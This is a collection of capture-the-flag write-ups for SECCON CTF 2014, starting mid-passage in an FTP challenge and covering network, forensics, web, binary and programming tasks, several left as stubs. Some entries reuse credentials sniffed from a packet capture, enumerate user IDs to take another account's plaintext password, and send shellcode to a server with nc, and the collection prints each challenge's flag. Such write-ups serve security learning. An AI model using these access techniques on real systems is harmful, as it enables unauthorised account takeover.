Name (ftpsv.quals.seccon.jp:mathias): anonymous
ano331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6816|).
502 LIST not implemented.
ftp>
```

Let’s try using `nc` instead so we can send raw FTP commands more easily:

```
$ nc ftpsv.quals.seccon.jp 21
220 (vsFTPd 2.3.5(SECCON Custom))
USER anonymous
331 Please specify the password.
PASS anonymous
230 Login successful.
LIST
502 LIST not implemented.
STAT .
213-Status follows:
drwxr-xr-x    2 0        107          4096 Nov 29 04:43 .
drwxr-xr-x    2 0        107          4096 Nov 29 04:43 ..
-rw-r--r--    1 0        0              38 Nov 29 04:43 key_is_in_this_file_afjoirefjort94dv7u.txt
213 End of status
^C
```

The `STAT` command can be used with a parameter [in which case it’s similar to the `LIST` command](http://www.nsftools.com/tips/RawFTP.htm#STAT). Now that we know the file name, let’s request it:

```bash
$ curl 'ftp://ftpsv.quals.seccon.jp/key_is_in_this_file_afjoirefjort94dv7u.txt'
SECCON{S0m3+im3_Pr0t0c0l_t411_4_1i3.}
```

The flag is `SECCON{S0m3+im3_Pr0t0c0l_t411_4_1i3.}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-net300-writeup/>
# SECCON CTF 2014: Get the key

**Category:** Network
**Points:** 100
**Description:**

> [`nw100.pcap`](nw100.pcap)

## Write-up

Let’s open [the provided packet capture file](nw100.pcap) in Wireshark.

In frame 21 (`frame.number == 21`) a request is made to `http://133.242.224.21:6809/nw100/` using Basic Authentication, with username `seccon2014` and password `YourBattleField`. Let’s re-use those credentials to log in:

```bash
$ curl --user 'seccon2014:YourBattleField' 'http://133.242.224.21:6809/nw100/''
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /nw100</title>
 </head>
 <body>
<h1>Index of /nw100</h1>
<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[DIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="key.html">key.html</a></td><td align="right">29-Nov-2014 22:12  </td><td align="right"> 48 </td><td>&nbsp;</td></tr>
<tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.2.22 (Debian) Server at 133.242.224.21 Port 6809</address>
</body></html>
```

The page shows a directory listing with a single file named `key.html` in it. Let’s take a look:

```bash
$ curl --user 'seccon2014:YourBattleField' 'http://133.242.224.21:6809/nw100/key.html'
<HTML>
SECCON{Basic_NW_Challenge_Done!}
</HTML>
```

The flag is `SECCON{Basic\_NW\_Challenge\_Done!}`.`

## Other write-ups and resources

* <https://shankaraman.wordpress.com/2014/12/07/seccon-2014-writeups-networking-100-and-programming-100/>
* <http://icheernoom.blogspot.de/2014/12/seccon-ctf-2014-get-key-network-write-up.html>
* [Indonesian](http://www.hasnydes.us/2014/12/get-the-key-seccon-ctf-2014-100pts/)
# SECCON CTF 2014: Get the key.txt

**Category:** Forensics
**Points:** 100
**Description:**

> [`forensic100.zip`](forensic100.zip)

## Write-up

Let’s extract [the provided ZIP file](forensic100.zip):

```bash
$ file forensic100.zip
forensic100.zip: Zip archive data, at least v2.0 to extract

$ unzip forensic100.zip
Archive:  forensic100.zip
  inflating: forensic100
```

The extracted file is filesystem data:

```bash
$ file forensic100
forensic100: Linux rev 1.0 ext2 filesystem data
```

Let’s try to `mount` it.

```
$ mkdir /tmp/forensic100

$ cd /tmp/forensic100

$ mount -o loop forensic100 /tmp/forensic100

$ ls
1    116  133  150  168  185  201  219  236  33  50  68  85
10   117  134  151  169  186  202  22   237  34  51  69  86
100  118  135  152  17   187  203  220  238  35  52  7   87
101  119  136  153  170  188  204  221  239  36  53  70  88
102  12   137  154  171  189  205  222  24   37  54  71  89
103  120  138  155  172  19   206  223  240  38  55  72  9
104  121  139  156  173  190  207  224  241  39  56  73  90
105  122  14   157  174  191  208  225  242  4   57  74  91
106  123  140  158  175  192  209  226  243  40  58  75  92
107  124  141  159  176  193  21   227  244  41  59  76  93
108  125  142  16   177  194  210  228  25   42  6   77  94
109  126  143  160  178  195  211  229  26   43  60  78  95
11   127  144  161  179  196  212  23   27   44  61  79  96
110  128  145  162  18   197  213  230  28   45  62  8   97
111  129  146  163  180  198  214  231  29   46  63  80  98
112  13   147  164  181  199  215  232  3    47  64  81  99
113  130  148  165  182  2    216  233  30   48  65  82  lost+found
114  131  149  166  183  20   217  234  31   49  66  83
115  132  15   167  184  200  218  235  32   5   67  84
```

It worked! That’s a lot of files. Let’s take the hint from the challenge title and look for occurrences of `key.txt` within those files.

```bash
$ grep -r 'key.txt' .
Binary file ./1 matches
```

Let’s take a closer look at file `1`:

```bash
$ file 1
1: gzip compressed data, was "key.txt", from Unix, last modified: Wed Oct  1 02:00:52 2014
```

Oh, it’s gzip-compressed data. Let’s decompress it:

```bash
$ gunzip < 1
SECCON{@]NL7n+-s75FrET]vU=7Z}
```

The flag is `SECCON{@]NL7n+-s75FrET]vU=7Z}`.

## Other write-ups and resources

* <http://icheernoom.blogspot.de/2014/12/seccon-ctf-2014-get-keytxt-forensics.html>
* [Indonesian](http://www.hasnydes.us/2014/12/get-key-txt-seccon-ctf-writeups-100pts/)
# SECCON CTF 2014: Holy shellcode

**Category:** Exploit
**Points:** 400
**Description:**

> Get the `keyword.txt` from `hebrew.pwn.seccon.jp:10016`.
>
> Holy shellcode using Hebrew characters in UTF-16LE
<http://hebrew.pwn.seccon.jp/nikud/hebrew-utf16le.html>
>
> Server files:
>
> 1. [`stage16`](stage16)
> 2. [`stage16_conf`](stage16_conf)
>
> For example:
>
> ```bash
> $ vi holy.nasm
> BITS 32
> db 0x24,0xFB,0x34,0xFB,0x1E,0xFB,0x1F,0xFB
> db 0x0a
> $ nasm -f bin holy.nasm -o holy
> $ cat holy | nc hebrew.pwn.seccon.jp 10016
> ```
>
> Bless you!

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/seccon2014/holy_shellcode/>
* <http://pastebin.com/Fau8A3La>
# SECCON CTF 2014: Japanese super micro-controller

**Category:** Exploit
**Points:** 500
**Description:**

> Read `flag.txt`.
>
> <http://micro.pwn.seccon.jp/sh/>

## Write-up

(TODO)

## Other write-ups and resources

* <http://lovelydream.gitcafe.com/2014/12/08/seccon/#Exploitation_500_SH>
* <http://blog.dragonsector.pl/2014/12/seccon-2014-japanese-super-micro.html>
* <https://rzhou.org/~ricky/seccon2014/sh/test.py>
# SECCON CTF 2014: jspuzzle

**Category:** Web
**Points:** 100
**Description:**

> [`jspuzzle.zip`](https://github.com/ctfs/write-ups/tree/master/seccon-ctf-2014/challenge)
>
> You need to fill in all the blanks!

## Write-up

[The extracted contents of the provided ZIP file are available in the `challenge` directory.](https://github.com/ctfs/write-ups/tree/master/seccon-ctf-2014/challenge)

The `q.html` document contains a puzzle with a drag-and-drop interface. The goal is to construct valid JavaScript that executes `alert(1)` using nothing but the provided pieces. The SHA-1 hash of the expected solution is the flag.

The puzzle solution is:

```js
"use strict";

({ "function" : function() {
  this[ "null" ] = (new Function( "return" + "/*^_^*/" + "this" ))();
  var pattern = "^[w]$";
  var r = new RegExp( pattern );
  this[ r[ "exec" ]( pattern ) ][ "alert" ]( 1 );
}})[ "Function" [ "toLowerCase" ]() ]();
```

The corresponding SHA hash is `SECCON{3678cbe0171c8517abeab9d20786a7390ffb602d}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-jspuzzle/>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/w100-jspuzzle/)
# SECCON CTF 2014: Let’s disassemble

**Category:** Binary
**Points:** 200
**Description:**

> ```bash
> nc disassemble.quals.seccon.jp 23168
> ```

## Write-up

(TODO)

## Other write-ups and resources

* <http://lovelydream.gitcafe.com/2014/12/08/seccon/#Binary_200_Let’s_disassemble>
# SECCON CTF 2014: Ms. Fortune? Misfortune. 4096-bit RSA

**Category:** Start
**Points:** 100
**Description:**

> `encrypted.gpg` is encrypted by 4096-bit RSA algorithm. But I’m sure you can decrypt it.
>
> [`problem.tar.xz`](problem.tar.xz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://neg9.org/news/2015/3/9/seccon-ctf-2014-crypto-400-msfortune-4096-bit-rsa>
# SECCON CTF 2014: QR (Easy)

**Category:** QR
**Points:** 200
**Description:**

> Funniest joke in the world(?):
>
> “Last night, I had a dream I was eating QR cakes… but when I woke up, half my QR code was gone!”
>
> ![](DSC01964_s.JPG)

## Write-up

(TODO)

## Other write-ups and resources

* http://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/
# SECCON CTF 2014: REA-JUU WATCH

**Category:** Web
**Points:** 200
**Description:**

> <http://reajuu.pwn.seccon.jp/>

## Write-up

The URL points to a quiz website. After creating a new account and logging in, it poses six multiple-choice-style questions, one after the other. After answering these we end up at the URL <http://reajuu.pwn.seccon.jp/quiz/7> which displays “Game over” as well as our total score. By inspecting the network traffic while opening that last page, we note an Ajax request to <http://reajuu.pwn.seccon.jp/users/chk/13337> where `13337` is our user account ID. The response body contains the username, password, and the total score for that user, all in plain text:

```bash
$ curl http://reajuu.pwn.seccon.jp/users/chk/13337
{"username":"h1j9fgul","password":"fo1xe2mk","point":0}
```

Let’s see what happens if we request the data for user with ID `1`:

```bash
$ curl http://reajuu.pwn.seccon.jp/users/chk/1
{"username":"rea-juu","password":"way_t0_f1ag","point":99999}
```

After logging in on <http://reajuu.pwn.seccon.jp/> with username `rea-juu` and password `way\_t0\_f1ag` and finishing the quiz, the flag is revealed: `SECCON{REA\_JUU\_Ji8A\_NYAN}`.

## Other write-ups and resources

* <https://github.com/S42X/CTF/blob/master/SECCON/ReaJuuWatch.md>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/w200-rea-juu-watch/)
# SECCON CTF 2014: Read it

**Category:** Forensics
**Points:** 300
**Description:**

> [`Readit`](http://files.quals.seccon.jp/Readit)

## Write-up

(TODO)

```bash
$ file Readit
Readit: (Corel/WP)
```

## Other write-ups and resources

* <http://hackitta.net/seccon-ctf-2014-quals-readit/>
* [Portoguese](https://ctf-br.org/wiki/seccon/seccon2014/f300-readit/)
# SECCON CTF 2014

* <http://ctf.seccon.jp/>
* [Scoreboard](http://ctf.seccon.jp/rank/) or [local alternative for quals](scoreboard_quals.txt) or [local alternative for finals](scoreboard_finals.txt)
* [Number of solves per challenge](http://pastebin.com/raw.php?i=0aKPTrsY)
* [@secconctf on Twitter](https://twitter.com/secconctf)

## Completed write-ups

* [Binary Karuta](binary-karuta)
* [Bleeding “Heartbleed” Test Web](bleeding-heartbleed-test-web)
* [Choose the number](choose-the-number)
* [Easy Cipher](easy-cipher)
* [Get from curious “FTP” server](get-from-curious-ftp-server)
* [Get the key.txt](get-the-key-txt)
* [Get the key](get-the-key)
* [jspuzzle](jspuzzle)
* [REA-JUU WATCH](rea-juu-watch)
* [Reverse it](reverse-it)
* [SECCON Wars: The Flag Awakens](seccon-wars-the-flag-awakens)
* [Shuffle](shuffle)
* [The Golden Gate](the-golden-gate)
* [Welcome to SECCON](welcome-to-seccon)

## External write-ups only

* [Advanced RISC Machine](advanced-risc-machine)
* [Decrypt it (Easy)](decrypt-it-easy)
* [Holy shellcode](holy-shellcode)
* [Impossible](rop-impossible)
* [Japanese super micro-controller](japanese-super-micro-controller)
* [Let’s disassemble](lets-disassemble)
* [Ms. Fortune? Misfortune. 4096-bit RSA](ms-fortune-misfortune-4096-bit-rsa)
* [QR (Easy)](qr-easy)
* [Read it](read-it)
* [XSS Bonsai (aka. Hakoniwa XSS Reloaded)](xss-bonsai-aka-hakoniwa-xss-reloaded)

## Missing write-ups

* [BBQR](bbqr)
* [Confused analyte](confused-analyte)
* [Decrypt it (Hard)](decrypt-it-hard)
* [UnknownFS](unknownfs)
* [version2](version2)
# SECCON CTF 2014: Reverse it

**Category:** Binary
**Points:** 100
**Description:**

> [`Reverseit`](Reverseit)

## Write-up

Let’s take the challenge name literally and reverse the hexadecimal representation of the bytes in the file:

```bash
$ xxd -p Reverseit | tr -d '\n' | rev | xxd -r -p > reversed

$ file reversed
reversed: JPEG image data, JFIF standard 1.01
```

The result is a JPEG image that displays a horizontally flipped (“reversed”) version of the flag:

![](reversed.jpg)

The flag is `SECCON{6in\_tex7}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/12/seccon-ctf-2014-online-qualifications-reverseit-writeup/>
* <http://blogs.univ-poitiers.fr/e-laize/2014/12/07/seccon-2014-reverseit/>
* [Indonesian](http://www.hasnydes.us/2014/12/reverseit-binary-seccon-ctf-100pts/)
# SECCON CTF 2014: ROP: Impossible

**Category:** Exploit
**Points:** 500
**Description:**

> ropi.pwn.seccon.jp:10000
>
> Read `/flag` and write the content to stdout, such as the following pseudo code.
>
> ```
> open("/flag", 0);
> read(3, buf, 32);
> write(1, buf, 32);
> ```
>
> Notice that the `vuln` executable is protected by an Intel Pin tool, the source code of which is `norop.cpp`.
>
> [`vuln`](vuln)
> [`norop.cpp`](norop.cpp)
> [`norop_conf`](norop_conf)

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/seccon2014/rop_impossible/>
# SECCON CTF 2014: SECCON Wars: The Flag Awakens

**Category:** QR
**Points:** 300
**Description:**

> <http://youtu.be/1pC56S17-_A>
>
> # Not need Japanese text to solve this task.
> # If you need it? see below :)
> <http://pastebin.com/uXByBZv5>

## Write-up

The challenge links to a YouTube video: <https://www.youtube.com/watch?v=1pC56S17-_A>.

A bunch of Japanese text is displayed, but the description of the challenge told us that we weren’t required to understand it. At 56 seconds from the start of the video, the SECCON logo stands in front of the text, and we can see a QR code sliding in the background.

So, I recorded the frames of the video using VLC. To do so, you have to click on _Tools_ → _Preferences_, set the settings to _All_ and in the section _Video_, click _Filters_ and enable _Scene video filter_. Then under the _Filters_ menu click _scene filter_ to configure it. I configured it to save every frame, and started to play the video at the begining of the appearance of the QR code.

Once this was done, I wrote a small Python script to create an image combining the last line of pixels from every frame.

```python
import subprocess
from PIL import Image

width = 400
height = 300
result = Image.new('RGBA', (width, height))

img_list = subprocess.check_output(['ls', './']).split(b'\n')
i = 0
for img in img_list:
  if img[-4:] != b'.png':
    continue
  image = Image.open(img.decode('utf-8'))
  rgb_im = image.convert('RGB')
  for x in range(image.size[0]):
    for y in range(3):
      r, g, b = rgb_im.getpixel((x, image.size[1] - 1))
      result.putpixel((x, i + y),(r, g, b, 255))
    i += 3
result.save('result.png')
```

Running this script in the same directory where the saved frames are results in the following picture:

![](result.png)

…which should scan properly with almost any QR code reader, but I saw that some online QRcode reader couldn’t read it (because of the colors I guess) so after a few Gimp manipulations, I ended up with this:

![](result-modified.png)

The flag is `SECCON{M4Y 7H3 F0RC3 83 W17H U}`.

## Other write-ups and resources

* <http://blog.pnuts.tk/2014/12/seccon-qr300.html>
* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/f300-seccon-wars-the-flag-awakens/)
# SECCON CTF 2014: Shuffle

**Category:** Binary
**Points:** 100
**Description:**

> Find the string before randomizing.
>
> [`shuffle`](shuffle)

## Write-up

```bash
$ file shuffle
shuffle: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x392b3d943f673207d169fb2c65dc642bdd79679f, not stripped

$ gdb shuffle

(gdb) disas main
Dump of assembler code for function main:
   0x0804852d <+0>: push   ebp
   0x0804852e <+1>: mov    ebp,esp
   0x08048530 <+3>: push   esi
   0x08048531 <+4>: push   ebx
   0x08048532 <+5>: and    esp,0xfffffff0
   0x08048535 <+8>: sub    esp,0x50
   0x08048538 <+11>:  mov    eax,DWORD PTR [ebp+0xc]
   0x0804853b <+14>:  mov    DWORD PTR [esp+0xc],eax
   0x0804853f <+18>:  mov    eax,gs:0x14
   0x08048545 <+24>:  mov    DWORD PTR [esp+0x4c],eax
   0x08048549 <+28>:  xor    eax,eax
   0x0804854b <+30>:  mov    eax,0x53
   0x08048550 <+35>:  mov    BYTE PTR [esp+0x24],al
   0x08048554 <+39>:  mov    eax,0x45
   0x08048559 <+44>:  mov    BYTE PTR [esp+0x25],al
   0x0804855d <+48>:  mov    eax,0x43
   0x08048562 <+53>:  mov    BYTE PTR [esp+0x26],al
   0x08048566 <+57>:  mov    eax,0x43
   0x0804856b <+62>:  mov    BYTE PTR [esp+0x27],al
   0x0804856f <+66>:  mov    eax,0x4f
   0x08048574 <+71>:  mov    BYTE PTR [esp+0x28],al
   0x08048578 <+75>:  mov    eax,0x4e
   0x0804857d <+80>:  mov    BYTE PTR [esp+0x29],al
   0x08048581 <+84>:  mov    eax,0x7b
   0x08048586 <+89>:  mov    BYTE PTR [esp+0x2a],al
   0x0804858a <+93>:  mov    eax,0x57
   0x0804858f <+98>:  mov    BYTE PTR [esp+0x2b],al
   0x08048593 <+102>: mov    eax,0x65
   0x08048598 <+107>: mov    BYTE PTR [esp+0x2c],al
   0x0804859c <+111>: mov    eax,0x6c
   0x080485a1 <+116>: mov    BYTE PTR [esp+0x2d],al
   0x080485a5 <+120>: mov    eax,0x63
   0x080485aa <+125>: mov    BYTE PTR [esp+0x2e],al
   0x080485ae <+129>: mov    eax,0x6f
   0x080485b3 <+134>: mov    BYTE PTR [esp+0x2f],al
   0x080485b7 <+138>: mov    eax,0x6d
   0x080485bc <+143>: mov    BYTE PTR [esp+0x30],al
   0x080485c0 <+147>: mov    eax,0x65
   0x080485c5 <+152>: mov    BYTE PTR [esp+0x31],al
   0x080485c9 <+156>: mov    eax,0x20
   0x080485ce <+161>: mov    BYTE PTR [esp+0x32],al
   0x080485d2 <+165>: mov    eax,0x74
   0x080485d7 <+170>: mov    BYTE PTR [esp+0x33],al
   0x080485db <+174>: mov    eax,0x6f
   0x080485e0 <+179>: mov    BYTE PTR [esp+0x34],al
   0x080485e4 <+183>: mov    eax,0x20
   0x080485e9 <+188>: mov    BYTE PTR [esp+0x35],al
   0x080485ed <+192>: mov    eax,0x74
   0x080485f2 <+197>: mov    BYTE PTR [esp+0x36],al
   0x080485f6 <+201>: mov    eax,0x68
   0x080485fb <+206>: mov    BYTE PTR [esp+0x37],al
   0x080485ff <+210>: mov    eax,0x65
   0x08048604 <+215>: mov    BYTE PTR [esp+0x38],al
   0x08048608 <+219>: mov    eax,0x20
   0x0804860d <+224>: mov    BYTE PTR [esp+0x39],al
   0x08048611 <+228>: mov    eax,0x53
   0x08048616 <+233>: mov    BYTE PTR [esp+0x3a],al
   0x0804861a <+237>: mov    eax,0x45
   0x0804861f <+242>: mov    BYTE PTR [esp+0x3b],al
   0x08048623 <+246>: mov    eax,0x43
   0x08048628 <+251>: mov    BYTE PTR [esp+0x3c],al
   0x0804862c <+255>: mov    eax,0x43
   0x08048631 <+260>: mov    BYTE PTR [esp+0x3d],al
   0x08048635 <+264>: mov    eax,0x4f
   0x0804863a <+269>: mov    BYTE PTR [esp+0x3e],al
   0x0804863e <+273>: mov    eax,0x4e
   0x08048643 <+278>: mov    BYTE PTR [esp+0x3f],al
   0x08048647 <+282>: mov    eax,0x20
   0x0804864c <+287>: mov    BYTE PTR [esp+0x40],al
   0x08048650 <+291>: mov    eax,0x32
   0x08048655 <+296>: mov    BYTE PTR [esp+0x41],al
   0x08048659 <+300>: mov    eax,0x30
   0x0804865e <+305>: mov    BYTE PTR [esp+0x42],al
   0x08048662 <+309>: mov    eax,0x31
   0x08048667 <+314>: mov    BYTE PTR [esp+0x43],al
   0x0804866b <+318>: mov    eax,0x34
   0x08048670 <+323>: mov    BYTE PTR [esp+0x44],al
   0x08048674 <+327>: mov    eax,0x20
   0x08048679 <+332>: mov    BYTE PTR [esp+0x45],al
   0x0804867d <+336>: mov    eax,0x43
   0x08048682 <+341>: mov    BYTE PTR [esp+0x46],al
   0x08048686 <+345>: mov    eax,0x54
   0x0804868b <+350>: mov    BYTE PTR [esp+0x47],al
   0x0804868f <+354>: mov    eax,0x46
   0x08048694 <+359>: mov    BYTE PTR [esp+0x48],al
   0x08048698 <+363>: mov    eax,0x21
   0x0804869d <+368>: mov    BYTE PTR [esp+0x49],al
   0x080486a1 <+372>: mov    eax,0x7d
   0x080486a6 <+377>: mov    BYTE PTR [esp+0x4a],al
   0x080486aa <+381>: mov    eax,0x0
   0x080486af <+386>: mov    BYTE PTR [esp+0x4b],al
   0x080486b3 <+390>: mov    DWORD PTR [esp],0x0
   0x080486ba <+397>: call   0x80483b0 <time@plt>
   0x080486bf <+402>: mov    ebx,eax
   0x080486c1 <+404>: call   0x80483d0 <getpid@plt>
   0x080486c6 <+409>: add    eax,ebx
   0x080486c8 <+411>: mov    DWORD PTR [esp],eax
   0x080486cb <+414>: call   0x8048400 <srand@plt>
   0x080486d0 <+419>: mov    DWORD PTR [esp+0x14],0x0
   0x080486d8 <+427>: jmp    0x8048769 <main+572>
   0x080486dd <+432>: call   0x8048420 <rand@plt>
   0x080486e2 <+437>: mov    ecx,eax
   0x080486e4 <+439>: mov    edx,0xcccccccd
   0x080486e9 <+444>: mov    eax,ecx
   0x080486eb <+446>: mul    edx
   0x080486ed <+448>: shr    edx,0x5
   0x080486f0 <+451>: mov    eax,edx
   0x080486f2 <+453>: shl    eax,0x2
   0x080486f5 <+456>: add    eax,edx
   0x080486f7 <+458>: shl    eax,0x3
   0x080486fa <+461>: sub    ecx,eax
   0x080486fc <+463>: mov    edx,ecx
   0x080486fe <+465>: mov    DWORD PTR [esp+0x18],edx
   0x08048702 <+469>: call   0x8048420 <rand@plt>
   0x08048707 <+474>: mov    ecx,eax
   0x08048709 <+476>: mov    edx,0xcccccccd
   0x0804870e <+481>: mov    eax,ecx
   0x08048710 <+483>: mul    edx
   0x08048712 <+485>: shr    edx,0x5
   0x08048715 <+488>: mov    eax,edx
   0x08048717 <+490>: shl    eax,0x2
   0x0804871a <+493>: add    eax,edx
   0x0804871c <+495>: shl    eax,0x3
   0x0804871f <+498>: sub    ecx,eax
   0x08048721 <+500>: mov    edx,ecx
   0x08048723 <+502>: mov    DWORD PTR [esp+0x1c],edx
   0x08048727 <+506>: lea    edx,[esp+0x24]
   0x0804872b <+510>: mov    eax,DWORD PTR [esp+0x18]
   0x0804872f <+514>: add    eax,edx
   0x08048731 <+516>: movzx  eax,BYTE PTR [eax]
   0x08048734 <+519>: movsx  eax,al
   0x08048737 <+522>: mov    DWORD PTR [esp+0x20],eax
   0x0804873b <+526>: lea    edx,[esp+0x24]
   0x0804873f <+530>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048743 <+534>: add    eax,edx
   0x08048745 <+536>: movzx  eax,BYTE PTR [eax]
   0x08048748 <+539>: lea    ecx,[esp+0x24]
   0x0804874c <+543>: mov    edx,DWORD PTR [esp+0x18]
   0x08048750 <+547>: add    edx,ecx
   0x08048752 <+549>: mov    BYTE PTR [edx],al
   0x08048754 <+551>: mov    eax,DWORD PTR [esp+0x20]
   0x08048758 <+555>: lea    ecx,[esp+0x24]
   0x0804875c <+559>: mov    edx,DWORD PTR [esp+0x1c]
   0x08048760 <+563>: add    edx,ecx
   0x08048762 <+565>: mov    BYTE PTR [edx],al
   0x08048764 <+567>: add    DWORD PTR [esp+0x14],0x1
   0x08048769 <+572>: cmp    DWORD PTR [esp+0x14],0x63
   0x0804876e <+577>: jle    0x80486dd <main+432>
   0x08048774 <+583>: lea    eax,[esp+0x24]
   0x08048778 <+587>: mov    DWORD PTR [esp],eax
   0x0804877b <+590>: call   0x80483e0 <puts@plt>
   0x08048780 <+595>: mov    eax,0x0
   0x08048785 <+600>: mov    esi,DWORD PTR [esp+0x4c]
   0x08048789 <+604>: xor    esi,DWORD PTR gs:0x14
   0x08048790 <+611>: je     0x8048797 <main+618>
   0x08048792 <+613>: call   0x80483c0 <__stack_chk_fail@plt>
   0x08048797 <+618>: lea    esp,[ebp-0x8]
   0x0804879a <+621>: pop    ebx
   0x0804879b <+622>: pop    esi
   0x0804879c <+623>: pop    ebp
   0x0804879d <+624>: ret
End of assembler dump.
(gdb)
```

The `main` function contains a lot of hardcoded numeric values, the first of which can be seen at `0x0804854b` and the last of which is a `0x0` at `0x080486aa`. Here’s the full list:

```
0x53
0x45
0x43
0x43
0x4f
0x4e
0x7b
0x57
0x65
0x6c
0x63
0x6f
0x6d
0x65
0x20
0x74
0x6f
0x20
0x74
0x68
0x65
0x20
0x53
0x45
0x43
0x43
0x4f
0x4e
0x20
0x32
0x30
0x31
0x34
0x20
0x43
0x54
0x46
0x21
0x7d
0x0
```

Those all look like Unicode code points in the ASCII range. Let’s turn these numbers into a string:

```bash
$ node
> String.fromCharCode(0x53, 0x45, 0x43, 0x43, 0x4f, 0x4e, 0x7b, 0x57, 0x65, 0x6c, 0x63, 0x6f, 0x6d, 0x65, 0x20, 0x74, 0x6f, 0x20, 0x74, 0x68, 0x65, 0x20, 0x53, 0x45, 0x43, 0x43, 0x4f, 0x4e, 0x20, 0x32, 0x30, 0x31, 0x34, 0x20, 0x43, 0x54, 0x46, 0x21, 0x7d, 0x0)
'SECCON{Welcome to the SECCON 2014 CTF!}\0'
```

It’s indeed a null-terminated string that contains the flag `SECCON{Welcome to the SECCON 2014 CTF!}`.

## Other write-ups and resources

* [Portuguese](https://ctf-br.org/wiki/seccon/seccon2014/r100-shuffle/)
# SECCON CTF 2014: The Golden Gate

**Category:** Programming
**Points:** 400
**Description:**

> We’ve found an encoder board along with cipher text. Please help us to decrypt it.
>
> The cipher text: `BQDykmgZ0I6SaQnq4o/iEONudetXdPJdpl1UVSlU69oZOtvqnHfinOpcEfIjXy9okkVpsuw2kpKS==`
>
> Main: [encoder board photos (Google Drive)](https://drive.google.com/a/seccon.jp/folderview?id=0B1HyMpKFOlLZRXc0YVNTX2E0dU0&usp=sharing)
> Mirror: [`encoder_board_photos.zip`](encoder_board_photos.zip)

## Write-up

This challenge is fairly straightforward: you are given some pictures of an encoder board and a ciphertext. To solve this challenge, you need to understand the encoder board and reverse-engineer it to decrypt the ciphertext. But understanding the encoder board was a bit tricky due to many wires crossing each other and some sneaky use of pull-up and pull-down inputs. First things first, we need to know what the chips are on the board, but luckily we can clearly see the name and a quick Google search for a [datasheet gives us the information we need](TC74HC00_Datasheet.pdf). The chip they used is a “quad 2-input nand gate”. This means that in each chip there are four NAND gates and each NAND gate has two inputs and one output. In the data sheet you can see the assignation of each pin. The next step is to map the wires and the solderings so that you can see what each input/button does to the leds. This is the tedious part of the challenge but below you can see an image of the map I made.

![](encoder.jpg)

If we study the map we can see that all the chips are [wired in the same way](http://upload.wikimedia.org/wikipedia/commons/f/fa/XOR_from_NAND.svg). That wiring can be reduced to a simple xor gate. The XOR function is associative and commutative. This gives us the following functions for the leds (outputs of the encoder board).

```
led1 = XOR(button1, button6, button8)
led2 = !button2 (This is the simplification of XOR(!button3, button3, button2))
led3 = !button3 (XOR'ing with 1 is the same as a NOT)
led4 = XOR(button2, button3, button6, button8)
led5 = XOR(button2, button7)
led6 = XOR(button2, button4, button6)
led7 = XOR(button2, button4)
led8 = XOR(button2, button3, button5)
```

Reversing this is — luckily for us — not that complicated since the reverse of a XOR is applying the same XOR. Which gives us the following equations for the buttons (inputs of the decoder) in function of the leds (outputs of the decoder).

```
button3 = !led3
button2 = !led2
button4 = XOR(button2, led7)
button7 = XOR(button2, led5)
button5 = XOR(button2, button3, led8)
button6 = XOR(button2, button4, led6)
button8 = XOR(button2, button3, button6, led4)
button1 = XOR(button6, button8, led1)
```

Note that for `button4` and `button7` you need to know the state of `button2`; for `button5` you need to know `button2` and `button3`, etc. Now that we have decoded the encoder board we can decrypt our cipher. Since we have exactly 8 inputs and 8 outputs we can assume the encoder was used to encrypt each byte of the cipher text. But as I said in the beginning there are some sneaky uses of pull-up inputs and pull-down inputs. The leds are wired to `vcc` so our output from the gates need to be `gnd` or `0`. This means we need to invert each byte before we decrypt. Another sneaky thing is that buttons 1, 2, 5, 7 are in a pull-up position which is to say when you don’t press the button (your input equals `0`) it will send a `1` to the gates. So we need to invert these buttons/bits after the decryption. I used [a script](goldengate.py) to decode the base64 string (which gives us our real ciphertext) and then decode the ciphertext to the plain text. The result isn’t something readable but if we look closer at the first bytes we can see that this is a header for gzip-compressed data (hex values: `1f 8b`). Unzipping the file results in a text file containing the flag.

The flag is `SECCON{Hlvd0toiXgloBhTM}`.

## Other write-ups and resources

* <https://gist.github.com/libmaru/b9bf5926aed97084b111>
# SECCON CTF 2014: UnknownFS

**Category:** Forensics
**Points:** 400
**Description:**

> This image formatted unknown file system.
> I guessed this file system like FAT file system same but different.
>
> [`unknownfs.zip`](unknownfs.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON CTF 2014: version2

**Category:** Network
**Points:** 200
**Description:**

> are you ready for upcoming version 2?
>
> srv h2o.pwn.seccon.jp.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SECCON CTF 2014: Welcome to SECCON

**Category:** Start
**Points:** 100
**Description:**

> The answer is `SECCON{20141206}`.

## Write-up

They aren’t kidding. The flag is truly `SECCON{20141206}`.

## Other write-ups and resources

* none yet
# SECCON CTF 2014: XSS Bonsai (aka. Hakoniwa XSS Reloaded)

**Category:** Web
**Points:** 500
**Description:**

> [`bonsaiXSS.zip`](bonsaiXSS.zip)
>
> This challenge has 2 answers (2 steps).
> If you collect 2 answers, you can get full points (500pts).
>
